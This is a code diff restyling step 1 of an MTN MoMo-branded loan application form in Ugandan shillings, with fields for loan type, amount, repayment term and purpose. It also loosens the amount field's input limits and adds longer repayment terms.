@@ -3,69 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Loan Details - MTN MoMo</title>
+    <title>Step 1 of 3 - Loan Information</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #f4f5f7; color: #333; min-height: 100vh; display: flex; flex-direction: column; font-family: system-ui, -apple-system, sans-serif; margin: 0; }
-        .top-header { background-color: #003366; color: #FFCC00; padding: 14px 20px; text-align: center; font-weight: 800; font-size: 1.1rem; }
-        .app-container { width: 100%; max-width: 550px; margin: 0 auto; background: #ffffff; padding: 24px 20px; flex-grow: 1; display: flex; flex-direction: column; justify-content: space-between; }
-        @media (min-width: 576px) {
-            body { background-color: #003366; padding: 20px 0; align-items: center; justify-content: center; }
-            .app-container { border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.25); flex-grow: 0; }
-            .top-header { display: none; }
+        * { box-sizing: border-box; }
+        html, body {
+            margin: 0; padding: 0; width: 100%; min-height: 100vh;
+            background-color: #003366; color: #333;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
-        .btn-momo { background-color: #003366; color: #FFCC00; font-weight: bold; font-size: 1.1rem; padding: 14px; border-radius: 12px; border: none; width: 100%; }
-        .form-control, .form-select { padding: 12px 15px; border-radius: 10px; font-size: 1rem; }
+        .header-bar {
+            background-color: #002244; padding: 14px 16px; text-align: center; color: white;
+        }
+        .main-content {
+            width: 100% !important; max-width: 550px !important;
+            margin: 0 auto; padding: 24px 20px;
+            background: #ffffff; min-height: calc(100vh - 60px);
+            border-top-left-radius: 24px; border-top-right-radius: 24px;
+        }
+        @media (min-width: 576px) {
+            body { display: flex; align-items: center; justify-content: center; padding: 30px 15px; }
+            .header-bar { display: none; }
+            .main-content { border-radius: 24px; min-height: auto; box-shadow: 0 12px 35px rgba(0,0,0,0.4); padding: 35px 25px; }
+        }
+        .step-badge {
+            background-color: #FFCC00; color: #003366; font-weight: 800;
+            font-size: 0.75rem; padding: 6px 12px; border-radius: 8px; text-transform: uppercase;
+        }
+        .form-control, .form-select {
+            border-radius: 12px; padding: 14px; border: 1px solid #ced4da; font-size: 1rem;
+        }
+        .form-control:focus, .form-select:focus {
+            border-color: #003366; box-shadow: 0 0 0 0.2rem rgba(0, 51, 102, 0.15);
+        }
+        .btn-continue {
+            background-color: #002244; color: #ffffff; font-weight: 800;
+            font-size: 1.05rem; padding: 16px; border-radius: 14px; border: none; width: 100%;
+            letter-spacing: 0.5px; box-shadow: 0 6px 20px rgba(0,34,68,0.25);
+        }
+        .btn-continue:active { background-color: #001529; }
     </style>
 </head>
 <body>
-    <div class="top-header d-sm-none">
-        <span style="background: #FFCC00; color: #003366; padding: 2px 8px; border-radius: 6px;">MM</span> MTN MoMo Loans
+
+    <div class="header-bar d-sm-none">
+        <span class="text-white fw-bold">MTN MoMo Loan Application</span>
     </div>
 
-    <div class="app-container">
-        <div>
-            <div class="d-flex justify-content-between align-items-center mb-3">
-                <span class="badge bg-warning text-dark px-3 py-2 fw-bold text-uppercase">Step 1 of 3</span>
-                <span class="text-muted small">Loan Amount</span>
-            </div>
-            
-            <h3 class="fw-bold text-dark mb-1">Loan Information</h3>
-            <p class="text-muted small mb-4">Select your requested loan amount and payment schedule.</p>
-
-            <form id="step1Form" action="/apply/step1" method="POST">
-                <div class="mb-3">
-                    <label class="form-label fw-semibold text-secondary small">Loan Type</label>
-                    <select class="form-select" name="loan_type" required>
-                        <option value="Personal Loan" selected>Personal Express Loan</option>
-                        <option value="Business Loan">Business Growth Loan</option>
-                        <option value="Emergency Loan">Emergency Advance</option>
-                    </select>
-                </div>
-
-                <div class="mb-3">
-                    <label class="form-label fw-semibold text-secondary small">Loan Amount (UGX)</label>
-                    <input type="number" class="form-control" name="amount" placeholder="e.g. 1000000" min="50000" max="10000000" required>
-                </div>
-
-                <div class="mb-3">
-                    <label class="form-label fw-semibold text-secondary small">Repayment Term</label>
-                    <select class="form-select" name="term" required>
-                        <option value="1 Month">1 Month</option>
-                        <option value="3 Months">3 Months</option>
-                        <option value="6 Months" selected>6 Months</option>
-                        <option value="12 Months">12 Months</option>
-                    </select>
-                </div>
-
-                <div class="mb-4">
-                    <label class="form-label fw-semibold text-secondary small">Purpose of Loan</label>
-                    <input type="text" class="form-control" name="purpose" placeholder="e.g. Business expansion, School fees" required>
-                </div>
-            </form>
+    <div class="main-content">
+        <div class="d-flex justify-content-between align-items-center mb-3">
+            <span class="step-badge">STEP 1 OF 3</span>
+            <span class="text-muted small fw-bold">Loan Amount</span>
         </div>
 
-        <button type="submit" form="step1Form" class="btn btn-momo shadow-sm mt-3">CONTINUE ➔</button>
+        <div class="mb-4">
+            <h2 class="fw-bold text-dark mb-1" style="font-size: 1.5rem;">Loan Information</h2>
+            <p class="text-muted small">Select your requested loan amount and payment schedule.</p>
+        </div>
+
+        <form action="/apply/step1" method="POST">
+            <div class="mb-3">
+                <label class="form-label text-secondary small fw-bold">Loan Type</label>
+                <select name="loan_type" class="form-select" required>
+                    <option value="Personal Express Loan" selected>Personal Express Loan</option>
+                    <option value="Business Advance Loan">Business Advance Loan</option>
+                    <option value="MoMo Emergency Loan">MoMo Emergency Loan</option>
+                </select>
+            </div>
+
+            <div class="mb-3">
+                <label class="form-label text-secondary small fw-bold">Loan Amount (UGX)</label>
+                <!-- Changed type="text" to allow any custom input amount without browser max limits -->
+                <input type="text" name="amount" class="form-control" value="{{ request.args.get('amount', '1000000') }}" required placeholder="e.g. 50000000">
+            </div>
+
+            <div class="mb-3">
+                <label class="form-label text-secondary small fw-bold">Repayment Period (Term)</label>
+                <select name="term" class="form-select" required>
+                    <option value="1 Month">1 Month</option>
+                    <option value="3 Months">3 Months</option>
+                    <option value="6 Months" selected>6 Months</option>
+                    <option value="12 Months">12 Months</option>
+                    <option value="24 Months">24 Months</option>
+                    <option value="48 Months">48 Months</option>
+                </select>
+            </div>
+
+            <div class="mb-4">
+                <label class="form-label text-secondary small fw-bold">Purpose of Loan</label>
+                <input type="text" name="purpose" class="form-control" placeholder="e.g. Business expansion, school fees..." required>
+            </div>
+
+            <button type="submit" class="btn btn-continue shadow-sm">CONTINUE ➔</button>
+        </form>
     </div>
+
 </body>
 </html>
